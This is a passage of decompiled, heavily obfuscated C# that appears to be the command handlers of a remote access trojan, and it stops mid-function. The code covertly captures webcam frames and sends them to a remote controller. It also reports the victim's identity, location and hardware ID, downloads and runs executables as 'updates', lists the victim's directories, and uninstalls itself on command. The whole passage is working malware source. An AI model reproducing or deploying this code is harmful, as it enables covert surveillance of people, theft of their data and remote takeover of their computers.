  [DllImport("iphlpapi.dll", EntryPoint = "GetExtendedTcpTable", SetLastError = true)]
  private static extern uint 貿뷝ួㄽ귡첡舎꘥\u0D5Bഺ쏀애ᳪ깎阹鲌丼雝㦫讶(
    IntPtr pTcpTable,
    ref int dwOutBufLen,
    bool sort,
    int ipVersion,
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE809ℙ櫄艚Ⱘ嫄ᱦ䘼\u2F5E恢ءꃐȯ\uFFFD븨辬뭆脆鳎莳 tblClass,
    uint reserved = 0);

  [DllImport("iphlpapi.dll", EntryPoint = "SetTcpEntry")]
  private static extern int 銪硍ʌ쟺츠힛\uE785ꤤ귓씖市碮ꞓ掠텗\u4DC7퀝뿰䶞叕(IntPtr pTcprow);

  public static void ッオ庒뤝駘膜仼댚\u0BDC施昊䠞昋ⵢ\uE275棗掮農䏽伹(
    GetWebcams command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    Dictionary<string, List<Size>> webcams = new Dictionary<string, List<Size>>();
    foreach (FilterInfo filterInfo in (CollectionBase) new 湹끋\uE5D6㷆콣ポ嫔ꆇ\uFFFD딈\uE91D汖訨\uE707ꁈ\uE952븕\u2BA9ⴆ墯(\u055F땙ᨳꥅ蠣\uA63B䉦ˌ妗㴃\u0877䭎\uF57A勒쫴뀮ֹ\uF123ꘟ\uFFFD.\uF3A3鎭⁦\uFFFD\uE02F輬瞋\u322B솢곽\uAAD8섹臥䠔\uE8E1ꪝ롞拧鏈爰))
    {
      List<Size> sizeList = new List<Size>();
      foreach (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 videoCapability in new VideoCaptureDevice(filterInfo.MonikerString).VideoCapabilities)
        sizeList.Add(videoCapability.돴힗睷뙔顣덡ථ\uF1C0籝ᶲ䞨Ἰ啚菍뭗摅\u207D\uEB7F\uED9E\uF625);
      webcams.Add(filterInfo.Name, sizeList);
    }
    if (webcams.Count <= 0)
      return;
    new GetWebcamsResponse(webcams).Execute(client);
  }

  public static void 侢郊얱놛\uF0BA䢢북秈斥ᑃ虙\uFE6C抹የ穋\u33A0佚꧒簾\u0B8C(
    GetWebcam command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.砩沸瘌\uF05E탄\uE699陌\uE2A8绹恓氛㝘\u2237ꤦᯃꉙ寫扸ණꩿ = client;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.븦䧈瞶翋鳇\uF0DB滴終㠓똜\uF79Aᐇ夿띛撮佔稁\u2F95퉌藢 = true;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.뎫냧ⴱꊷ썖ၪ㤸\u125Fﾔꠁ楯\uF15C졒\u002Eꕊ䘁뎭\uFFFD\u209E덩 = command.Webcam;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.䎻㾭ᾏ䶃讒荰ꐟ擾爵꾃쎄\uFB0Cꇒ\u0EFC棙ꯀ馓ຄ餵\u0C3C = command.Resolution;
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE9E7篹帒饼\u1779\u0FDF너\uEA1Bᣴ궔쁸݀评㢏濞渌\uEE92淋嶧漍)
      return;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧 = new VideoCaptureDevice(new 湹끋\uE5D6㷆콣ポ嫔ꆇ\uFFFD딈\uE91D汖訨\uE707ꁈ\uE952븕\u2BA9ⴆ墯(\u055F땙ᨳꥅ蠣\uA63B䉦ˌ妗㴃\u0877䭎\uF57A勒쫴뀮ֹ\uF123ꘟ\uFFFD.\uF3A3鎭⁦\uFFFD\uE02F輬瞋\u322B솢곽\uAAD8섹臥䠔\uE8E1ꪝ롞拧鏈爰)[command.Webcam].MonikerString);
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.NewFrame += new \u2049\uFFFD皨檍ᨕ\uF47A\uEBA3뵸鲑里㯝楴킆\uE41D\uE096ᬞˇ\uE5E9幺狘(\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\u275C㣠圸\u332A戹\uF5DC쳥䀧塬쥔ﶜ\uE679㯒ꥠ쁗肴谊孡폥껟);
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.VideoResolution = \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.VideoCapabilities[command.Resolution];
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.Start();
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE9E7篹帒饼\u1779\u0FDF너\uEA1Bᣴ궔쁸݀评㢏濞渌\uEE92淋嶧漍 = true;
  }

  public static void \uE456俅랓眸駃胎侧郝僤ܝ랏ᝂ뗱\uEAA4僎\uE836鐩裲鬄ޒ(
    DoWebcamStop command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.븦䧈瞶翋鳇\uF0DB滴終㠓똜\uF79Aᐇ夿띛撮佔稁\u2F95퉌藢 = false;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE9E7篹帒饼\u1779\u0FDF너\uEA1Bᣴ궔쁸݀评㢏濞渌\uEE92淋嶧漍 = false;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.砩沸瘌\uF05E탄\uE699陌\uE2A8绹恓氛㝘\u2237ꤦᯃꉙ寫扸ණꩿ = (㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦) null;
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧 == null)
      return;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.NewFrame -= new \u2049\uFFFD皨檍ᨕ\uF47A\uEBA3뵸鲑里㯝楴킆\uE41D\uE096ᬞˇ\uE5E9幺狘(\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\u275C㣠圸\u332A戹\uF5DC쳥䀧塬쥔ﶜ\uE679㯒ꥠ쁗肴谊孡폥껟);
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.Stop();
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧 = (VideoCaptureDevice) null;
  }

  private static void \u275C㣠圸\u332A戹\uF5DC쳥䀧塬쥔ﶜ\uE679㯒ꥠ쁗肴谊孡폥껟(
    object sender,
    科վሺ辛ힻ\uFFFD鼺Ύ뉄馣욹\uE421〩丢〫관\uE652蠟楨䬙 e)
  {
    if (!\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE9E7篹帒饼\u1779\u0FDF너\uEA1Bᣴ궔쁸݀评㢏濞渌\uEE92淋嶧漍)
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧.Stop();
    if (!\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.븦䧈瞶翋鳇\uF0DB滴終㠓똜\uF79Aᐇ夿띛撮佔稁\u2F95퉌藢)
      return;
    using (MemoryStream memoryStream = new MemoryStream())
    {
      ((Image) e.Frame.Clone()).Save((Stream) memoryStream, ImageFormat.Bmp);
      new GetWebcamResponse(memoryStream.ToArray(), \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.뎫냧ⴱꊷ썖ၪ㤸\u125Fﾔꠁ楯\uF15C졒\u002Eꕊ䘁뎭\uFFFD\u209E덩, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.䎻㾭ᾏ䶃讒荰ꐟ擾爵꾃쎄\uFB0Cꇒ\u0EFC棙ꯀ馓ຄ餵\u0C3C).Execute(\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.砩沸瘌\uF05E탄\uE699陌\uE2A8绹恓氛㝘\u2237ꤦᯃꉙ寫扸ණꩿ);
      memoryStream.Close();
    }
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.븦䧈瞶翋鳇\uF0DB滴終㠓똜\uF79Aᐇ夿띛撮佔稁\u2F95퉌藢 = false;
  }

  public static void 듗ᖧ룚葧朙㞟梵킘\uEB9F릖븫\uFFFD\u21FA니А报\u248C鲛쳀\uF5BB(
    GetAuthentication command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.ꃦ\uEC0Eេ隯ྛ粱틫퍤섩뷏\u2482頾ɔぇ\uF067㓡ꎁ\uEB6Eﱜ㫕();
    new GetAuthenticationResponse(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뺲戜\u287C扩翸锔\uE142\uFFFD䊆쒔꽘ㆢ㗚덷\uE853\u2088ⵅ朣㬢\u0B98, ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.FullName, \u2731믻靖ᧅ衉\u2AA6쫘詖땒\uF433ᣬ飩\u2052蹗\u09F7밹쯦띠颉ᝳ.ᜄի뎮ȱ\uE3E7錦烊裛荪炑\uF6B6痌\u21E4嬢闄Ꮬ\u0D5E\u0017\uE779䚽(), 䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Country, 䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.CountryCode, 䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Region, 䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.City, 䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.ImageIndex, \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.HardwareId, \u2731믻靖ᧅ衉\u2AA6쫘詖땒\uF433ᣬ飩\u2052蹗\u09F7밹쯦띠颉ᝳ.柰篋鏵稴㱕뻔\u1B4C\u2343\u2909嫕\uED3C욙ꔾ㟬㛜鮥曈ᗻ黹篨(), 틒\uFFFD\u324C踩퓆뵷͆ᆄ㐛꼈\uE588\u08DD孃ᖈ\uF623덬렦蜾\u21C5鹩.앦懻㯺몑逿翗礓脯핗ㆀ梲酟ꈡ侬ꓨ᳧良እﲧ떬(), 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.텥\u00A7잀\uFFFD㠠鶽ೌ튻圕\u300A쏵\uE6FC龆\u22C9܏칱ꗒ\u061B䗯뽴).Execute(client);
    if (!熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.AddToStartupFailed)
      return;
    Thread.Sleep(2000);
    new SetStatus("Adding to startup failed.").Execute(client);
  }

  public static void 졸쵘\uE0B6ೌᥱ樉ﾷ\uFFFD툌紜䀥\u3325楈꺾ၧỖ\uF499㣢ᜭ\uFBBD(
    DoClientUpdate command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑\uA836챒㐚𢡊\u0BFA䨗 벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑\uA836챒㐚𢡊\u0BFA䨗();
    // ISSUE: reference to a compiler-generated field
    벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.㽀\uF095降뿺黋卝轸\u1879إ馁晊둖맲Ãⴖ\uFFFD손\u192C\u266B怏 = client;
    // ISSUE: reference to a compiler-generated field
    벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C = command;
    // ISSUE: reference to a compiler-generated field
    if (string.IsNullOrEmpty(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.DownloadURL))
    {
      // ISSUE: reference to a compiler-generated field
      if (!\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID))
      {
        // ISSUE: reference to a compiler-generated field
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Add(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID, 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(".exe"));
      }
      // ISSUE: reference to a compiler-generated field
      string str = \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮[벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID];
      try
      {
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.CurrentBlock == 0 && !环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.顳쎩隥鑽\uFFFD̰\uEE6E㖸锰\uF2DB쇟颹옞閨\uFFFD\uF7D6\u2082体겡깗(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.Block))
          throw new Exception("No executable file");
        䇎ꡲ㱨秋秚饹꯴儎縥\uFFFD膚\u27E1\u08DC蘯\uE5AAᜊ퍔薭瘴쌱 䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱 = new 䇎ꡲ㱨秋秚饹꯴儎縥\uFFFD膚\u27E1\u08DC蘯\uE5AAᜊ퍔薭瘴쌱(str);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (!䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱.\uE179婎䠡\u287F\uFFFD稱垷䢝\uF49E덄\u2A52ﴰ\uEC0E눇譁欲ⴙ뗡롽豼(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.Block, 벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.CurrentBlock))
          throw new Exception(䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱.LastError);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.CurrentBlock + 1 != 벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.MaxBlocks)
          return;
        // ISSUE: reference to a compiler-generated field
        if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID))
        {
          // ISSUE: reference to a compiler-generated field
          \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Remove(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID);
        }
        // ISSUE: reference to a compiler-generated field
        new SetStatus("Updating...").Execute(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.㽀\uF095降뿺黋卝轸\u1879إ馁晊둖맲Ãⴖ\uFFFD손\u192C\u266B怏);
        // ISSUE: reference to a compiler-generated field
        \u29A4紶\uF38Fፂ렁줵뿿\uE798\uFFFDᔎ싈\uE940䂼ﹻ슊拧궠\uE654่\u2917.抌쵽ૅ\u29D2锁ﺅ\uFFFD\u2014\uEED1苯ᬊ\uFFFD䑾\uFFFD蘉ꡛ륉㞵弆쿓(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.㽀\uF095降뿺黋卝轸\u1879إ馁晊둖맲Ãⴖ\uFFFD손\u192C\u266B怏, str);
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID))
        {
          // ISSUE: reference to a compiler-generated field
          \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Remove(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.\uF885厺䵼㠷兲琤\uEF58뼥쬊뾦\uE766\u207C뜈黲ÉꙞ峍\uEB76\u3323\u331C.ID);
        }
        蛲鷿㹣\uF592홅\uE8CB\uE05E泆菘ꕾꂥ\u23ED戅立\uF0BB夞鍋ᑄ㶻馚.њኋ\uE563Ṯ\uEFE3\uE6D8䬙䙒瀇㹆\uE277\uE082\u29A2뗮㩹䝞耏\u1940쑊溘(str);
        // ISSUE: reference to a compiler-generated field
        new SetStatus(string.Format("Update failed: {0}", (object) ex.Message)).Execute(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.㽀\uF095降뿺黋卝轸\u1879إ馁晊둖맲Ãⴖ\uFFFD손\u192C\u266B怏);
      }
    }
    else
    {
      // ISSUE: reference to a compiler-generated method
      new Thread(new ThreadStart(벤ᾀ榉炯䵢쨤ꗶꪶ瀈碈烙虯ꙸ묑챒㐚𢡊䨗.븃\uE176ꔁ圌謴\uFBC4\u2568Ȿﮟ糼聆\uE539\u2EE1샭琣\uEC6B൫汐ᶡꮀ)).Start();
    }
  }

  public static void \uE51E\uE5EB犤绢䥁鉶㣋堻\uFFFD駸짮蜂\u2E6F\u23B6武볫妭퀈罕ｊ(
    DoClientUninstall command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    new SetStatus("Uninstalling... bye ;(").Execute(client);
    イ軶뢽槿䤽\u281A쓸ﲁ໓漠\uA8FE\u2304쁭伂凿돿\uE1A9隆䒴斠.ⱝ\u3296옺쬮撎쑉娝\u322Eᮓ꽧ￎ聄歱䇄䗅\u083E鍇珀\uFFFDⷤ(client);
  }

  public static void 똙엣墎鳹頻阷\uE1A1귵쎠ಾ䝠ᄞ䪔\uEEFE抚쵝ꂇ缭ೡ堲(
    GetDirectory command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE63E䞄ყ\u0AF8໌듃휴ЩӲ镾ቯ\uEE3B臝\uA63E䕻쎌荷łẅ쑄 䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE63E䞄ყ\u0AF8໌듃휴ЩӲ镾ቯ\uEE3B臝\uA63E䕻쎌荷łẅ쑄();
    // ISSUE: reference to a compiler-generated field
    䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.鈽伋裄\uF489ｩ\uE8A4깢䱄萲꯵\u0CBB갍돏ｍ洴녧獝洠鹭\u2ED8 = false;
    // ISSUE: reference to a compiler-generated field
    䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.ᑰ袬ꄨ쐶恊鶹摓婟뮾ጎ쥾剻钵蟚田䌼艔\uF29C킄ᵝ = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.\uEAE6醙ꮕ\u098Eꩼ矉붦珪ĉⲚ汅畱쪔᬴낿\uE296\uEB06寑廿호);
    try
    {
      DirectoryInfo directoryInfo1 = new DirectoryInfo(command.RemotePath);
      FileInfo[] files1 = directoryInfo1.GetFiles();
      DirectoryInfo[] directories = directoryInfo1.GetDirectories();
      string[] files2 = new string[files1.Length];
      long[] filessize = new long[files1.Length];
      string[] folders = new string[directories.Length];
      int index1 = 0;
      foreach (FileInfo fileInfo in files1)
      {
        files2[index1] = fileInfo.Name;
        filessize[index1] = fileInfo.Length;
        ++index1;
      }
      if (files2.Length == 0)
      {
        files2 = new string[1]{ "$E$" };
        filessize = new long[1];
      }
      int index2 = 0;
      foreach (DirectoryInfo directoryInfo2 in directories)
      {
        folders[index2] = directoryInfo2.Name;
        ++index2;
      }
      if (folders.Length == 0)
        folders = new string[1]{ "$E$" };
      new GetDirectoryResponse(files2, folders, filessize).Execute(client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("GetDirectory No permission");
